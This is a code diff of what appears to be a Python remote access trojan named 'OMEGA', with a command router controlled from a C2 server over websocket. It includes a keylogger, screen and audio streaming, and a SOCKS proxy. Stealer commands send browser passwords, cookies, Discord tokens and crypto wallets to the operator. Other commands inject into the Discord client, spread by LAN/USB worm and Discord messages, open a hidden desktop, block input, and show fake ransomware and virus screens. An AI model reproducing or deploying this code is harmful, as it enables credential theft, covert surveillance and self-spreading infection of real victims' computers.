+                st._mouse_l.daemon = True
+                st._mouse_l.start()
         else:
-            # If running as Script
-            cmd = f'timeout /t 3 & del /f /q "{__file__}"'
-            subprocess.Popen(cmd, shell=True)
-            
-        await send(ws, {"t": "info", "msg": "☢️ SELF DESTRUCT INITIATED. Node will go offline and purge files."})
-        await asyncio.sleep(1)
-        os._exit(0)
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Self-destruct error: {e}"})
-
-
-# ── SOCKS PROXY ENGINE ──────────────────────────────────────────────────────
-_socks_conns = {} # conn_id -> (reader, writer)
-
-@register_command("socks_open")
-async def cmd_socks_open(msg, ws):
-    """Opens a new TCP connection on behalf of the SOCKS proxy."""
-    conn_id = msg.get("id")
-    addr    = msg.get("addr")
-    port    = msg.get("port")
-    
-    async def _proxy_loop(cid, reader):
-        try:
-            while True:
-                data = await reader.read(16384)
-                if not data:
-                    break
-                await send(ws, {
-                    "t": "socks_data",
-                    "id": cid,
-                    "data": data.hex()
-                })
-        except Exception:
-            pass
-        finally:
-            _socks_conns.pop(cid, None)
-
-    try:
-        reader, writer = await asyncio.open_connection(addr, port)
-        _socks_conns[conn_id] = (reader, writer)
-        asyncio.create_task(_proxy_loop(conn_id, reader))
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"SOCKS Connect Error: {e}"})
-
-
-@register_command("socks_data")
-async def cmd_socks_data(msg, ws):
-    """Relays data from the C2 server to the target TCP connection."""
-    conn_id = msg.get("id")
-    data    = bytes.fromhex(msg.get("data", ""))
-    if conn_id in _socks_conns:
-        _, writer = _socks_conns[conn_id]
-        try:
-            writer.write(data)
-            await writer.drain()
-        except Exception:
-            _socks_conns.pop(conn_id, None)
-
-
-@register_command("socks_close")
-async def cmd_socks_close(msg, ws):
-    """Closes a SOCKS connection."""
-    conn_id = msg.get("id")
-    if conn_id in _socks_conns:
-        _, writer = _socks_conns.pop(conn_id)
-        writer.close()
-
-
-@register_command("get_monitor_info")
-async def cmd_get_monitor_info(msg, ws):
-    """Returns monitor count, resolution, and DPI info."""
-    def _run():
-        try:
-            import ctypes
-            user32 = ctypes.windll.user32
-            # Primary monitor
-            w = user32.GetSystemMetrics(0)
-            h = user32.GetSystemMetrics(1)
-            monitors = user32.GetSystemMetrics(80)  # SM_CMONITORS
-            # Virtual desktop (all monitors combined)
-            vw = user32.GetSystemMetrics(78)   # SM_CXVIRTUALSCREEN
-            vh = user32.GetSystemMetrics(79)   # SM_CYVIRTUALSCREEN
-            # DPI
-            dpi = user32.GetDpiForSystem() if hasattr(user32, 'GetDpiForSystem') else 96
-            out = (
-                f"=== MONITOR INFO ===\n\n"
-                f"Monitor Count : {monitors}\n"
-                f"Primary Res   : {w}x{h}\n"
-                f"Virtual Screen: {vw}x{vh}\n"
-                f"System DPI    : {dpi} ({round(dpi/96*100)}%)\n"
-            )
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "shell_out", "data": out}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"monitor_info error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-@register_command("detailed_process_list")
-async def cmd_detailed_process_list(msg, ws):
-    """Returns a detailed process list with PID, CPU, RAM, and path."""
-    def _run():
-        try:
-            import psutil
-            rows = []
-            for p in sorted(psutil.process_iter(['pid','name','cpu_percent','memory_info','exe']),
-                            key=lambda x: x.info.get('memory_info').rss if x.info.get('memory_info') else 0,
-                            reverse=True)[:60]:
-                try:
-                    mem_mb = round(p.info['memory_info'].rss / 1024 / 1024, 1) if p.info.get('memory_info') else 0
-                    cpu    = p.info.get('cpu_percent', 0)
-                    exe    = p.info.get('exe', '') or ''
-                    rows.append(f"{str(p.info['pid']).ljust(7)} {str(p.info['name']).ljust(30)} {str(mem_mb).rjust(8)}MB  {str(cpu).rjust(5)}%  {exe[:60]}")
+            if hasattr(st, "_mouse_l") and st._mouse_l:
+                try: st._mouse_l.stop()
                 except: pass
-            out = "=== TOP 60 PROCESSES (by RAM) ===\n\n"
-            out += f"{'PID'.ljust(7)} {'NAME'.ljust(30)} {'RAM'.rjust(9)}    {'CPU'.rjust(6)}  PATH\n"
-            out += "-" * 80 + "\n"
-            out += "\n".join(rows)
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "shell_out", "data": out}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"proc_list error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
+                st._mouse_l = None
+    except: pass
 
-
-@register_command("reg_delete")
-async def cmd_reg_delete(msg, ws):
-    """Deletes a registry key or value."""
-    hive  = msg.get("hive", "HKCU")
-    path  = msg.get("path", "")
-    value = msg.get("value", "")
+def _mnk_key(block: bool):
     try:
-        import winreg
-        hmap = {
-            "HKCU": winreg.HKEY_CURRENT_USER,
-            "HKLM": winreg.HKEY_LOCAL_MACHINE,
-            "HKCR": winreg.HKEY_CLASSES_ROOT,
-        }
-        root = hmap.get(hive.upper(), winreg.HKEY_CURRENT_USER)
-        if value:
-            with winreg.OpenKey(root, path, 0, winreg.KEY_WRITE) as k:
-                winreg.DeleteValue(k, value)
-            await send(ws, {"t": "info", "msg": f"Deleted value '{value}' from {hive}\\{path}"})
+        import pynput.keyboard as pk
+        if block:
+            if not hasattr(st, "_keyboard_l") or st._keyboard_l is None:
+                st._keyboard_l = pk.Listener(suppress=True)
+                st._keyboard_l.daemon = True
+                st._keyboard_l.start()
         else:
-            winreg.DeleteKey(root, path)
-            await send(ws, {"t": "info", "msg": f"Deleted key {hive}\\{path}"})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"reg_delete error: {e}"})
+            if hasattr(st, "_keyboard_l") and st._keyboard_l:
+                try: st._keyboard_l.stop()
+                except: pass
+                st._keyboard_l = None
+    except: pass
 
-
-# ── MAIN ──
-async def main():
+# ─────────────────────────────────────────────────────────────────────────────
+# KEYLOGGER
+# ─────────────────────────────────────────────────────────────────────────────
+def _keylog_start():
+    def on_press(key):
+        if not st.keylog_active: return False
+        try: st.keylog_data.append(key.char or "")
+        except: st.keylog_data.append(f"[{key}]")
     try:
-        _bootstrap_modules()
-    except:
-        pass
+        import pynput.keyboard as pk
+        pk.Listener(on_press=on_press).start()
+    except: pass
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TASK MANAGER — full process list with CPU + RAM
+# ─────────────────────────────────────────────────────────────────────────────
+def _get_process_list():
+    try:
+        import psutil
+        procs = []
+        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info', 'status']):
+            try:
+                mi = p.info.get('memory_info')
+                procs.append({
+                    "pid":    p.info['pid'],
+                    "name":   p.info['name'] or "",
+                    "cpu":    round(p.info.get('cpu_percent', 0) or 0, 1),
+                    "mem":    round((mi.rss if mi else 0) / (1024*1024), 1),
+                    "status": p.info.get('status', '')
+                })
+            except (psutil.NoSuchProcess, psutil.AccessDenied): pass
+        return sorted(procs, key=lambda x: x['mem'], reverse=True)
+    except Exception as e:
+        log(f"[TASKS] get_process_list error: {e}")
+        return []
+
+def _kill_process(pid: int):
+    try:
+        import psutil
+        psutil.Process(pid).terminate()
+        return True
+    except Exception as e:
+        log(f"[TASKS] kill {pid} error: {e}")
+        return False
+
+# ─────────────────────────────────────────────────────────────────────────────
+# COMMAND ROUTER
+# ─────────────────────────────────────────────────────────────────────────────
+async def handle(msg, ws):
+    # Accept both "t" and "type" fields — fixes portal command miss bug
+    t = msg.get("t") or msg.get("type", "")
+
+    # ── Streaming ─────────────────────────────────────────────────────────────
+    if t == "ss_start":
+        st.streaming = True
+        log("[STREAM] Infinite Uplink Active.")
+        await send(ws, {"t": "log", "msg": "Screen Stream Started."})
+    elif t == "ss_stop":
+        st.streaming = False
+        log("[STREAM] Uplink Terminated.")
+        await send(ws, {"t": "log", "msg": "Screen Stream Stopped."})
+    elif t == "set_quality":
+        st.quality = int(msg.get("v", 70))
+    elif t == "set_monitor":
+        idx = int(msg.get("v", 0))
+        st.monitor_idx = idx
+        if capture_engine is not None:
+            try: capture_engine.set_monitor(idx)
+            except: pass
+        log(f"[STREAM] Monitor switched to #{idx}")
+        await send(ws, {"t": "monitor_ack", "idx": idx})
+    elif t == "set_grid":
+        st.grid_mode = bool(msg.get("v", False))
+        log(f"[STREAM] Grid mode: {st.grid_mode}")
+    elif t == "audio_start": st.audio_active = True
+    elif t == "audio_stop":  st.audio_active = False
+
+    # ── WebRTC Signaling ──────────────────────────────────────────────────────
+    elif t == "rtc_offer":
+        if _rtc is not None:
+            st.streaming = True
+            try: await _rtc.handle_offer(msg["sdp"], msg["type"])
+            except Exception as e: log(f"[RTC] offer error: {e}")
+    elif t == "rtc_ice":
+        if _rtc is not None:
+            try: _rtc.add_ice_candidate(msg)
+            except: pass
+
+    elif t == "rtc_toggle":
+        act = msg.get("action")
+        val = msg.get("value")
+        if act == "monitor":
+            idx = int(val)
+            st.monitor_idx = idx
+            if capture_engine is not None:
+                try: capture_engine.set_monitor(idx)
+                except: pass
+            try: await send(ws, {"t": "monitors", "data": capture_engine.get_monitors()})
+            except: pass
+        elif act == "style":
+            if capture_engine is not None:
+                try: capture_engine.set_style(str(val))
+                except: pass
+        elif act == "camera": st.camera_active = bool(val)
+        elif act == "mic":    st.audio_active = bool(val)
+        elif act == "audio":  st.audio_active = bool(val)
+
+    # ── Screenshot ────────────────────────────────────────────────────────────
+    elif t == "screenshot":
+        data = await asyncio.to_thread(_screenshot)
+        if data: await send_bin(ws, 0x03, data)
+        await send(ws, {"t": "screenshot_done"})
+
+    # ── Task Manager ──────────────────────────────────────────────────────────
+    elif t == "get_procs":
+        procs = await asyncio.to_thread(_get_process_list)
+        await send(ws, {"t": "process_list", "data": procs})
+
+    elif t == "kill_proc":
+        pid = int(msg.get("pid", 0))
+        ok = await asyncio.to_thread(_kill_process, pid)
+        await send(ws, {"t": "info", "msg": f"Process {pid} {'terminated' if ok else 'kill failed'}"})
+        # Refresh process list after kill
+        await asyncio.sleep(0.3)
+        procs = await asyncio.to_thread(_get_process_list)
+        await send(ws, {"t": "process_list", "data": procs})
+
+    # ── Wallpaper (URL) ───────────────────────────────────────────────────────
+    elif t == "wallpaper":
+        url = msg.get("url", "")
+        if url:
+            import urllib.request
+            data = await asyncio.to_thread(lambda: urllib.request.urlopen(url, timeout=10).read())
+            ok   = await asyncio.to_thread(_set_wallpaper, data)
+            await send(ws, {"t": "info", "msg": "Wallpaper set!" if ok else "Wallpaper failed"})
+
+    elif t == "wallpaper_upload":
+        b64 = msg.get("data", "")
+        if b64:
+            data = base64.b64decode(b64)
+            ok   = await asyncio.to_thread(_set_wallpaper, data)
+            await send(ws, {"t": "info", "msg": "Wallpaper set from upload!" if ok else "Failed"})
+
+    # ── Keylogger ─────────────────────────────────────────────────────────────
+    elif t == "keylog_start":
+        st.keylog_active = True; st.keylog_data = []
+        threading.Thread(target=_keylog_start, daemon=True).start()
+        await send(ws, {"t": "info", "msg": "Keylogger started"})
+    elif t == "keylog_stop":
+        st.keylog_active = False
+        await send(ws, {"t": "info", "msg": "Keylogger stopped"})
+    elif t == "keylog_dump":
+        data = "".join(st.keylog_data)
+        await send(ws, {"t": "info", "msg": f"KEYLOG: {data}"})
+        st.keylog_data = []
+
+    # ── Omega Harvest ─────────────────────────────────────────────────────────
+    elif t == "harvest":
+        def _do_harvest(ws_obj):
+            try:
+                mod_run = stealer_omega.run_omega_harvest if stealer_omega is not None else None
+                if mod_run is None:
+                    try:
+                        from modules.stealer import run_omega_harvest as mod_run
+                    except:
+                        asyncio.run_coroutine_threadsafe(
+                            send(ws_obj, {"t": "info", "msg": "[ERROR] No stealer module"}), global_loop)
+                        return
+                def relay_log(m):
+                    asyncio.run_coroutine_threadsafe(
+                        send(ws_obj, {"t": "info", "msg": m}), global_loop)
+                zip_data = mod_run(log_func=relay_log)
+                if zip_data:
+                    asyncio.run_coroutine_threadsafe(
+                        send_bin(ws_obj, 0x06, zip_data), global_loop)
+                    relay_log("[SUCCESS] Harvest complete.")
+                else:
+                    relay_log("[ERROR] Harvest failed.")
+            except Exception as e:
+                asyncio.run_coroutine_threadsafe(
+                    send(ws_obj, {"t": "info", "msg": f"[ERROR] {e}"}), global_loop)
+        threading.Thread(target=_do_harvest, args=(ws,), daemon=True).start()
+
+    # ── Elite Commands ────────────────────────────────────────────────────────
+    elif t == "killexplorer":
+        subprocess.run("taskkill /f /im explorer.exe", shell=True)
+
+    elif t == "listen":
+        res = await asyncio.to_thread(_recognize)
+        await send(ws, {"t": "info", "msg": f"Heard: {res}"})
+    elif t == "video":
+        asyncio.create_task(_play_video(msg.get("url", "")))
+    elif t == "streamkey":
+        keys = await asyncio.to_thread(_get_stream_keys)
+        await send(ws, {"t": "info", "msg": f"OBS: {keys['obs']} | SLOBS: {keys['slobs']}"})
+
+    elif t == "grab_all":
+        try:
+            if stealer is not None:
+                loot = {"passwords": [], "cookies": []}
+                tokens = []
+                wallets = []
+                try: loot = await asyncio.to_thread(stealer.get_browser_loot)
+                except: pass
+                try: tokens = await asyncio.to_thread(stealer.get_discord_tokens)
+                except: pass
+                try: wallets = await asyncio.to_thread(stealer.get_wallet_data)
+                except: pass
+                await send(ws, {
+                    "t": "grab_res",
+                    "passwords": loot.get('passwords', []),
+                    "cookies": loot.get('cookies', []),
+                    "tokens": tokens,
+                    "wallets": wallets
+                })
+            else:
+                await send(ws, {"t": "info", "msg": "[GRAB] Stealer module not loaded"})
+        except Exception as e:
+            await send(ws, {"t": "info", "msg": f"[GRAB] Error: {e}"})
+
+    elif t == "inject":
+        if injection is not None:
+            await asyncio.to_thread(injection.inject_discord)
+        await send(ws, {"t": "log", "msg": "Discord Client Injection Complete."})
+
+    elif t == "spread":
+        spread_text = msg.get("m", "Hey check this!")
+        if stealer is not None:
+            tokens = await asyncio.to_thread(stealer.get_discord_tokens)
+            if tokens:
+                threading.Thread(target=spreader.spread_discord,
+                                 args=(tokens[0], spread_text), daemon=True).start()
+                await send(ws, {"t": "log", "msg": "Friend Spreading Triggered."})
+            else: await send(ws, {"t": "log", "msg": "No Discord Tokens Found."})
+        else: await send(ws, {"t": "log", "msg": "Stealer module not loaded."})
+
+    elif t == "worm":
+        if worm is not None:
+            threading.Thread(target=worm.lan_spreader, daemon=True).start()
+            threading.Thread(target=worm.usb_spreader, daemon=True).start()
+        await send(ws, {"t": "log", "msg": "LAN/USB Worm Spreading Started."})
+
+    elif t == "hvnc":
+        if hvnc is not None:
+            await asyncio.to_thread(hvnc.start_hvnc_session)
+        await send(ws, {"t": "log", "msg": "Hidden Desktop (HVNC) Session Active."})
+
+    elif t == "web_inject":
+        if web_injector is not None:
+            threading.Thread(target=web_injector.monitor_browser_titles, daemon=True).start()
+        await send(ws, {"t": "log", "msg": "Web Injection / Watchdog Started."})
+
+    elif t == "troll":
+        act = msg.get("action", "")
+        val = msg.get("value", "")
+
+        if act == "msg":
+            threading.Thread(target=_msgbox, args=(val,), daemon=True).start()
+            await send(ws, {"t": "info", "msg": "Message box launched"})
+        elif act == "tts":
+            threading.Thread(target=_speak, args=(val,), daemon=True).start()
+            await send(ws, {"t": "info", "msg": "TTS launched"})
+        elif act == "fakeransom":
+            import urllib.request
+            try:
+                data = await asyncio.to_thread(
+                    lambda: urllib.request.urlopen(RANSOM_WALLPAPER_URL).read())
+                await asyncio.to_thread(_set_wallpaper, data)
+                await asyncio.to_thread(minimize_all_windows)
+                await send(ws, {"t": "info", "msg": "Fake ransomware deployed"})
+            except: pass
+        elif act == "jumpscare":
+            try:
+                from modules.fun import js_manager
+                img_url = msg.get("image", "https://raw.githubusercontent.com/yunginnocence/Jumpscare/main/jeff.jpg")
+                snd_url = msg.get("sound", "https://raw.githubusercontent.com/yunginnocence/Jumpscare/main/scream.mp3")
+                js_manager.start(img_url, snd_url)
+                await send(ws, {"t": "info", "msg": "Jumpscare triggered"})
+            except Exception as e:
+                await send(ws, {"t": "info", "msg": f"Jumpscare error: {e}"})
+        elif act == "stop_js":
+            try:
+                from modules.fun import js_manager
+                js_manager.stop()
+                await send(ws, {"t": "info", "msg": "Jumpscare terminated"})
+            except: pass
+        elif act == "bsod":
+            try:
+                from modules.fun import trigger_bsod
+                trigger_bsod()
+            except: pass
+        elif act == "lock_mnk":
+            threading.Thread(target=_mnk_mouse, args=(True,), daemon=True).start()
+            threading.Thread(target=_mnk_key, args=(True,), daemon=True).start()
+            await send(ws, {"t": "info", "msg": "Input Blocked"})
+        elif act == "unlock_mnk":
+            threading.Thread(target=_mnk_mouse, args=(False,), daemon=True).start()
+            threading.Thread(target=_mnk_key, args=(False,), daemon=True).start()
+            await send(ws, {"t": "info", "msg": "Input Unblocked"})
+        elif act == "cursorlock":
+            st.cursor_locked = True
+            def _lock_cursor():
+                _u32 = ctypes.windll.user32
+                sw = _u32.GetSystemMetrics(0)
+                sh = _u32.GetSystemMetrics(1)
+                cx, cy = sw // 2, sh // 2
+                while st.cursor_locked:
+                    try: _u32.SetCursorPos(cx, cy)
+                    except: pass
+                    time.sleep(0.016)
+            threading.Thread(target=_lock_cursor, daemon=True).start()
+            await send(ws, {"t": "info", "msg": "Cursor Locked"})
+        elif act == "cursorunlock":
+            st.cursor_locked = False
+            await send(ws, {"t": "info", "msg": "Cursor Unlocked"})
+        elif act == "minimizeall":
+            await asyncio.to_thread(minimize_all_windows)
+            await send(ws, {"t": "info", "msg": "Windows Minimized"})
+        elif act == "shutdown":
+            subprocess.Popen(["shutdown", "/p", "/f"],
+                             creationflags=subprocess.CREATE_NO_WINDOW)
+            await send(ws, {"t": "info", "msg": "System going down..."})
+        elif act == "chaos_mouse":
+            st.mouse_chaos = True
+            threading.Thread(target=_chaos_mouse_loop, daemon=True).start()
+            await send(ws, {"t": "info", "msg": "Chaos mouse active"})
+        elif act == "stop_chaos":
+            st.mouse_chaos = False
+            await send(ws, {"t": "info", "msg": "Chaos mouse stopped"})
+        elif act == "flip_screen":
+            if recon is not None:
+                res = await asyncio.to_thread(recon.flip_screen, int(val or 0))
+                await send(ws, {"t": "info", "msg": res})
+        elif act == "eject_cd":
+            if recon is not None:
+                res = await asyncio.to_thread(recon.eject_cd)
+                await send(ws, {"t": "info", "msg": res})
+        elif act == "set_volume":
+            level = int(msg.get("value", 50))
+            if recon is not None:
+                res = await asyncio.to_thread(recon.set_volume, level)
+            else:
+                await asyncio.to_thread(_set_volume, level)
+                res = f"Volume: {level}%"
+            await send(ws, {"t": "info", "msg": res})
+        elif act == "get_volume":
+            vol = 50
+            if recon is not None:
+                vol = await asyncio.to_thread(recon.get_volume)
+            await send(ws, {"t": "volume", "level": vol})
+        elif act == "chat_popup":
+            msg_text = msg.get("value", "Hello")
+            threading.Thread(
+                target=lambda t=msg_text: ctypes.windll.user32.MessageBoxW(
+                    0, t, "OMEGA Message", 0x40), daemon=True).start()
+        elif act == "printer_spam":
+            if recon is not None:
+                res = await asyncio.to_thread(recon.printer_spam, str(val))
+                await send(ws, {"t": "info", "msg": res})
+        elif act == "fake_update":
+            subprocess.Popen(
+                ["powershell", "-Command",
+                 'Start-Process mshta.exe -ArgumentList "about:<html><body bgcolor=black><center style=margin-top:30vh><h1 style=color:white;font-family:Segoe UI;font-size:3em>Windows Update</h1><h3 style=color:#aaa>Updating your PC... Do not turn off your computer</h3></center></body></html>" -WindowStyle Maximized'],
+                creationflags=subprocess.CREATE_NO_WINDOW)
+            await send(ws, {"t": "info", "msg": "Fake update screen launched"})
+        elif act == "kill_explorer":
+            await asyncio.to_thread(subprocess.run, "taskkill /f /im explorer.exe",
+                                    shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            await send(ws, {"t": "info", "msg": "Explorer killed"})
+        elif act == "start_explorer":
+            subprocess.Popen("explorer.exe", shell=True)
+            await send(ws, {"t": "info", "msg": "Explorer restarted"})
+        elif act == "hide_icons":
+            await asyncio.to_thread(subprocess.run,
+                r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideIcons /t REG_DWORD /d 1 /f',
+                shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            await send(ws, {"t": "info", "msg": "Desktop icons hidden"})
+        elif act == "show_icons":
+            await asyncio.to_thread(subprocess.run,
+                r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideIcons /t REG_DWORD /d 0 /f',
+                shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            await send(ws, {"t": "info", "msg": "Desktop icons restored"})
+
+        # ── NEW v25 TROLL ACTIONS ─────────────────────────────────────────────
+        elif act == "hide_taskbar":
+            def _hide_tb():
+                subprocess.run(r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3" /v Settings /t REG_BINARY /d 30000000FEFFFFFF020000003800000000000000C00F00005F060000030000000000000000000000AB000000 /f', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                subprocess.run("taskkill /f /im explorer.exe", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                subprocess.Popen("explorer.exe")
+            threading.Thread(target=_hide_tb, daemon=True).start()
+            await send(ws, {"t": "info", "msg": "Taskbar hidden"})
+
+        elif act == "show_taskbar":
+            def _show_tb():
+                subprocess.run(r'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3" /v Settings /f', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                subprocess.run("taskkill /f /im explorer.exe", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                subprocess.Popen("explorer.exe")
+            threading.Thread(target=_show_tb, daemon=True).start()
+            await send(ws, {"t": "info", "msg": "Taskbar restored"})
+
+        elif act == "invert_screen":
+            subprocess.Popen(
+                ["powershell", "-Command",
+                 '$wshell = New-Object -com "WScript.Shell"; $wshell.SendKeys("%(LEFT)"); '
+                 'Add-Type -AssemblyName System.Windows.Forms; '
+                 '[System.Windows.Forms.SendKeys]::SendWait("%{LEFT}");'],
+                creationflags=subprocess.CREATE_NO_WINDOW)
+            # Use Magnifier color inversion shortcut: Win + Ctrl + I
+            ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)   # Win down
+            ctypes.windll.user32.keybd_event(0x11, 0, 0, 0)   # Ctrl down
+            ctypes.windll.user32.keybd_event(0x49, 0, 0, 0)   # I down
+            ctypes.windll.user32.keybd_event(0x49, 0, 2, 0)
+            ctypes.windll.user32.keybd_event(0x11, 0, 2, 0)
+            ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)
+            await send(ws, {"t": "info", "msg": "Screen inversion toggled"})
+
+        elif act == "screen_off":
+            ctypes.windll.user32.SendMessageW(
+                ctypes.windll.user32.GetDesktopWindow(),
+                0x0112, 0xF170, 2)  # WM_SYSCOMMAND, SC_MONITORPOWER, off
+            await send(ws, {"t": "info", "msg": "Monitor turned off"})
+
+        elif act == "screen_on":
+            ctypes.windll.user32.mouse_event(0x0001, 0, 0, 0, 0)
+            await send(ws, {"t": "info", "msg": "Monitor woken"})
+
+        elif act == "swap_mouse":
+            cur = ctypes.windll.user32.GetSystemMetrics(23)  # SM_SWAPBUTTON
+            ctypes.windll.user32.SwapMouseButton(0 if cur else 1)
+            await send(ws, {"t": "info", "msg": "Mouse buttons swapped" if not cur else "Mouse buttons restored"})
+
+        elif act == "sticky_keys":
+            # Trigger StickyKeys dialog via rapid Shift presses in background
+            def _sticky():
+                for _ in range(6):
+                    ctypes.windll.user32.keybd_event(0x10, 0, 0, 0)
+                    time.sleep(0.05)
+                    ctypes.windll.user32.keybd_event(0x10, 0, 2, 0)
+                    time.sleep(0.05)
+            threading.Thread(target=_sticky, daemon=True).start()
+            await send(ws, {"t": "info", "msg": "StickyKeys grief triggered"})
+
+        elif act == "high_contrast":
+            threading.Thread(target=lambda: subprocess.run(
+                'powershell -Command "Add-Type -TypeDefinition \'public class HC { [System.Runtime.InteropServices.DllImport(\\\"user32\\\")]  public static extern bool SystemParametersInfo(uint uiA, uint uiP, ref HICONTRAST pvP, uint fWinIni); }\'; [HC]::SystemParametersInfo(67,0,[ref](new-object HICONTRAST),3)"',
+                shell=True, creationflags=subprocess.CREATE_NO_WINDOW), daemon=True).start()
+            await send(ws, {"t": "info", "msg": "High contrast toggled"})
+
+        elif act == "night_light":
+            threading.Thread(target=lambda: subprocess.run(
+                r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\CloudStore\Store\DefaultAccount\Current\default$windows.data.bluelightreduction.bluelightreductionstate\windows.data.bluelightreduction.bluelightreductionstate" /v Data /t REG_BINARY /d 02000000 /f',
+                shell=True, creationflags=subprocess.CREATE_NO_WINDOW), daemon=True).start()
+            await send(ws, {"t": "info", "msg": "Night light forced on"})
+
+        elif act == "clipboard_spam":
+            spam_text = msg.get("value", "OMEGA WAS HERE 💀🔥")
+            def _cspam():
+                for _ in range(100):
+                    try:
+                        subprocess.run(
+                            f'powershell -Command "Set-Clipboard -Value \'{spam_text}\'"',
+                            shell=True, creationflags=subprocess.CREATE_NO_WINDOW,
+                            timeout=2)
+                        time.sleep(0.1)
+                    except: break
+            threading.Thread(target=_cspam, daemon=True).start()
+            await send(ws, {"t": "info", "msg": "Clipboard spam started"})
+
+        elif act == "notification_spam":
+            notif_text = msg.get("value", "⚠️ Your computer has a virus!")
+            def _nspam():
+                for i in range(10):
+                    try:
+                        subprocess.run(
+                            ["powershell", "-Command",
+                             f'[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType=WindowsRuntime] | Out-Null;'
+                             f'$xml = New-Object Windows.Data.Xml.Dom.XmlDocument;'
+                             f'$xml.LoadXml("<toast><visual><binding template=\'ToastText01\'><text id=\'1\'>{notif_text}</text></binding></visual></toast>");'
+                             f'$toast = [Windows.UI.Notifications.ToastNotification]::new($xml);'
+                             f'[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Omega").Show($toast);'],
+                            creationflags=subprocess.CREATE_NO_WINDOW)
+                        time.sleep(1.5)
+                    except: break
+            threading.Thread(target=_nspam, daemon=True).start()
+            await send(ws, {"t": "info", "msg": "Notification spam started"})
+
+        elif act == "fake_virus":
+            # Spawn a full-screen fake AV scan window
+            html = """<html><body style='background:#000;font-family:Consolas;color:#0f0;padding:40px'>
+<h1 style='color:red'>⚠️ CRITICAL VIRUS DETECTED</h1>
+<p>Scanning system files...</p>
+<pre id='s'></pre>
+<script>
+let i=0, files=[
+'C:\\Windows\\System32\\kernel32.dll',
+'C:\\Windows\\System32\\ntdll.dll',
+'C:\\Program Files\\Common Files\\services.exe',
+'C:\\Users\\Public\\Documents\\startup.exe',
+'C:\\Windows\\Temp\\trojan_dropper.bin',
+'C:\\ProgramData\\backdoor_connect.dll',
+'C:\\Windows\\System32\\svchost.exe (INFECTED)',
+];
+function tick(){
+  document.getElementById('s').textContent += '> SCANNING: '+files[i%files.length]+'...INFECTED\\n';
+  i++;
+  setTimeout(tick, 200);
+}
+tick();
+</script></body></html>"""
+            tmp = tempfile.mktemp(suffix=".html")
+            open(tmp, "w", encoding="utf-8").write(html)
+            subprocess.Popen(f'mshta.exe "{tmp}"',
+                             creationflags=subprocess.CREATE_NO_WINDOW)
+            await send(ws, {"t": "info", "msg": "Fake virus scanner launched"})
+
+        elif act == "fake_activation":
+            # Fake Windows activation watermark via nircmd / text overlay
+            html = """<html><body style='background:transparent;margin:0'>
+<div style='position:fixed;bottom:10px;right:10px;color:rgba(255,255,255,0.4);font:14px Segoe UI;user-select:none;pointer-events:none'>
+Activate Windows<br>Go to Settings to activate Windows.
+</div></body></html>"""
+            tmp = tempfile.mktemp(suffix=".html")
+            open(tmp, "w").write(html)
+            subprocess.Popen(
+                ["powershell", "-Command",
+                 f'Start-Process mshta.exe -ArgumentList \'{tmp}\' -WindowStyle Normal'],
+                creationflags=subprocess.CREATE_NO_WINDOW)
+            await send(ws, {"t": "info", "msg": "Fake activation watermark shown"})
+
+        elif act == "open_url":
+            url = msg.get("value", "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+            subprocess.Popen(f'start "" "{url}"', shell=True,
+                             creationflags=subprocess.CREATE_NO_WINDOW)
+            await send(ws, {"t": "info", "msg": f"URL opened: {url}"})
+
+        elif act == "url_spam":
+            url  = msg.get("value", "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+            cnt  = min(int(msg.get("count", 5)), 20)
+            def _urlspam():
+                for _ in range(cnt):
+                    subprocess.Popen(f'start "" "{url}"', shell=True,
+                                     creationflags=subprocess.CREATE_NO_WINDOW)
+                    time.sleep(0.5)
+            threading.Thread(target=_urlspam, daemon=True).start()
+            await send(ws, {"t": "info", "msg": f"Opened {cnt} tabs"})
+
+        elif act == "maximize_all":
+            threading.Thread(target=lambda: subprocess.run(
+                "powershell -Command \"(New-Object -ComObject Shell.Application).MinimizeAll()\"",
+                shell=True, creationflags=subprocess.CREATE_NO_WINDOW), daemon=True).start()
+            await send(ws, {"t": "info", "msg": "All windows minimized"})
+
+        elif act == "beep_pattern":
+            def _beep():
+                patterns = [(800,200),(400,200),(1200,100),(200,500),(1000,300)]
+                for freq, dur in patterns:
+                    ctypes.windll.kernel32.Beep(freq, dur)
+                    time.sleep(0.05)
+            threading.Thread(target=_beep, daemon=True).start()
+            await send(ws, {"t": "info", "msg": "Beep pattern played"})
+
+        elif act == "audio_max":
+            try:
+                from ctypes import cast, POINTER
+                from comtypes import CLSCTX_ALL
+                from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+                devices = AudioUtilities.GetSpeakers()
+                iface   = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+                vol     = cast(iface, POINTER(IAudioEndpointVolume))
+                vol.SetMasterVolumeLevelScalar(1.0, None)
